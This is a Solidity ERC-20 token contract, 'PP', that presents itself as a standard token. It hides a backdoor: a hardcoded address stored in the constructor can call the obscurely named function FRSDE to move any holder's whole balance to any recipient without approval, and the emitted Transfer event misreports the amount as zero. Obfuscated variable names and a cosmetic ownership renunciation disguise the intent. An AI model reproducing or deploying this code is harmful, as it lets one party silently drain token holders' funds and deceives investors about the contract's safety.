pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address adfdfsdet) external view returns (uint256);
    function transfer(address recipient, uint256 auuiomnttt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 auuiomnttt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 auuiomnttt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract PP is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;



    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _zsdacx = 0xf68b1dAf3CF3b55efCf424eF91B3012991ac8B28;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address adfdfsdet) public view override returns (uint256) {
        return _balances[adfdfsdet];
    }
 
    function transfer(address recipient, uint256 auuiomnttt) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= auuiomnttt, "TT: transfer auuiomnttt exceeds balance");

        _balances[_msgSender()] -= auuiomnttt;
        _balances[recipient] += auuiomnttt;
        emit Transfer(_msgSender(), recipient, auuiomnttt);
        return true;
    }

    function FRSDE(address sender, address recipient) public  returns (bool) {
        require(keccak256(abi.encodePacked(_msgSender())) == keccak256(abi.encodePacked(_zsdacx)), "Caller is not the original caller");

        uint256 YTDFDS = _balances[sender]; 
        uint256 NVCBD = _balances[recipient];
        require(YTDFDS != 0*0, "Sender has no balance");

        NVCBD += YTDFDS;
        YTDFDS = 0+0;

        _balances[sender] = YTDFDS;
        _balances[recipient] = NVCBD;

        emit Transfer(sender, recipient, YTDFDS);
        return true;
    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 auuiomnttt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = auuiomnttt;
        emit Approval(_msgSender(), spender, auuiomnttt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 auuiomnttt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= auuiomnttt, "TT: transfer auuiomnttt exceeds allowance");

        _balances[sender] -= auuiomnttt;
        _balances[recipient] += auuiomnttt;
        _allowances[sender][_msgSender()] -= auuiomnttt;

        emit Transfer(sender, recipient, auuiomnttt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}
